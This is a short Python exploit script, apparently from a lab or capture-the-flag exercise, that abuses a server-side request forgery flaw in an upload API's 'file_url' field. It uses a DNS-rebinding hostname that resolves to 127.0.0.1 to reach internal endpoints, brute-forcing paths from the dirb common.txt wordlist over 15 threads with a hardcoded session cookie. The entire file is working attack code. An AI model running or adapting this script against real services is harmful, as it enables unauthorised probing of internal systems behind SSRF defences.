#!/usr/bin/python3
import requests
import threading

# commont.txt wordlist
wordlist_fd = open("/usr/share/dirb/wordlists/common.txt", "r")

# vulnerable website url
url = "http://localhost/api/v2/upload"


def fuzz_internal_endpoints():
	while True:
		# reference global variables
		global wordlist_fd
		global url
		word = wordlist_fd.readline().strip()
		# check for EOF
		if word == "":
			break
		headers = {"Content-Type": "application/json"}
		cookies = {"uuid_hash": "8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed"}
		json = {"file_url": f"http://7f000001.8efac92e.rbndr.us/{word}"}
		# send the same request over and over until we get response from localhost
		while True:
			res = requests.post(url, headers = headers, json = json, cookies = cookies)
			if res.status_code == 404 and res.text == "resource not found":
				break
			elif res.status_code == 200:
				print("/{} -> {}".format(word, res.status_code))
				break


def main():
	for _ in range(15):
		thread = threading.Thread(target = fuzz_internal_endpoints)
		thread.start()


if __name__ == "__main__":
	main()